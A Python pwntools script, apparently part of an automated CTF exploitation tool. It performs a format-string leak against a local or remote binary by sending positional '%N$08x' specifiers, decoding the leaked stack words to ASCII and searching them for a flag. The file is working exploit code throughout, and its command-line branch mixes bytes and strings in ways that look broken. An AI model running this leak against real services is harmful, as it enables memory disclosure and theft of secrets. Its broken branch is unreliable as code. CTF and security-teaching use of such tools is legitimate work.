from __future__ import print_function
from pwn import *
import binascii
import string

def checkLeak(binary_name,properties,remote_server=False,remote_url="",port_num=1337):

    full_string = b""
    run_count = 50

    #Should have plenty of _%x_ in string
    base_input_string = properties['pwn_type']['input']
    format_count = base_input_string.count(b'_%x')

    if properties['input_type'] == "STDIN" or properties['input_type'] == "LIBPWNABLE":
        for i in range((run_count // format_count) +1):

            #Create local or remote process
            if remote_server:
                proc = remote(remote_url,port_num)
            else:
                proc = process(binary_name)

            input_string = base_input_string

            #Swap in values for every _%x
            for j in range(format_count):
                iter_num = (i * format_count) + j
                #print(input_string)
                input_string = input_string.replace(b'_%x', b'_%' + str(iter_num).encode() + b'$08x', 1)

            #print("[+] Sending input {}".format(input_string))
            proc.sendline(input_string)

            results = proc.recvall(timeout=5)

            '''
            1. Split data by '_'
            2. Filter by hexdigits
            3. flip bytes for endianess
            4. hex to ascii converstion
            '''
            #print("results: ", results)
            data_leaks = results.decode().split('_')
            #print("data_leaks: ", data_leaks)
            
            data_leaks = [x[0:8] if all([y in string.hexdigits for y in x]) else "" for x in data_leaks]
            #print("data_leaks: ", data_leaks)

            data_leaks = [''.join([y[x:x+2] for x in range(0, len(y), 2)][::-1]) for y in data_leaks]
            # _data_leaks = []
            # for y in data_leaks:
            #     data_inner = [y[x:x+2] for x in range(0, len(y), 2)][::-1]
            #     print("data_inner: ", data_inner)
            #     _data_leaks.append(''.join(data_inner))
            # print("data_leaks: ", data_leaks)
            
            
            try:
                data_copy = data_leaks
                data_leaks = [binascii.unhexlify(x) for x in data_leaks]
            except:
                print ("[~] Odd length string detected... Skipping")
                temp_data = []
                for x in data_copy:
                    try:
                        temp_data.append(binascii.unhexlify(str(x)))
                    except:
                        pass
                        #print("[+] Bad chunk {}".format(x))

                data_leaks = temp_data

            # print("data_leaks: ", data_leaks)
            full_string += b''.join(data_leaks)
            # print("full_string: ", full_string)

        #Only return printable ASCII
        # full_string = b''.join([x if x in [y.encode() for y in string.printable] else b'' for x in full_string])
        # print("full_string: ", full_string)
    else:
        for i in range((run_count // format_count) +1):

            input_string = base_input_string

            #Swap in values for every _%x
            for j in range(format_count):
                iter_num = (i * format_count) + j
                input_string = input_string.replace('_%x','_%{}$08x'.format(iter_num),1).rstrip('\x00')

            #Create local or remote process
            proc = process([binary_name,input_string])



            #print("[+] Sending input {}".format(input_string))
            #proc.sendline(input_string)

            results = proc.recvall(timeout=5)

            '''
            1. Split data by '_'
            2. Filter by hexdigits
            3. flip bytes for endianess
            4. hex to ascii converstion
            '''
            data_leaks = results.split('_')
            
            
            #data_leaks = [x[0:8] if all([y in string.hexdigits for y in x]) else "" for x in data_leaks]
            print("data_leaks: ", data_leaks)
            _data_leaks = []
            for x in data_leaks:
                if all([y in string.hexdigits for y in x]):
                    _data_leaks.append(x[0:8])
                else:
                    _data_leaks.append("") 

            print("_data_leaks: ", _data_leaks)

            data_leaks = [''.join([y[x:x+2] for x in range(0, len(y), 2)][::-1]) for y in data_leaks]
            data_leaks = [binascii.unhexlify(x) for x in data_leaks]

            full_string += ''.join(data_leaks)

        #Only return printable ASCII
        full_string = ''.join([x if x in string.printable else '' for x in full_string])

    leakProperties = {}
    leakProperties['flag_found'] = False

    #Dumb check for finding flag
    if b'{' in full_string and b'}' in full_string:
        print("[+] Flag found:")
        leakProperties['flag_found'] = True


    leakProperties['leak_string'] = full_string
    print("[+] Returned {}".format(full_string))
    return leakProperties
        
